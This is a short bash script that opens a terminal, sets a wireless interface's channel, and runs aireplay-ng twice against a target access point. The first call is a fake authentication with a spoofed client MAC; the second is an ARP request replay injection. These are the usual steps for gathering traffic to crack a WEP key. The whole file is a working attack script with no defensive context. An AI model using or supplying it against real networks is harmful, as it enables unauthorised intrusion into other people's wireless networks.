#!/bin/bash
gnome-terminal -x sh -c "iwconfig $4 channel $5;aireplay-ng -1 0 -a $1 -h $2 -e $3 $4;aireplay-ng -3 -b $1 -h $2 $4; bash"

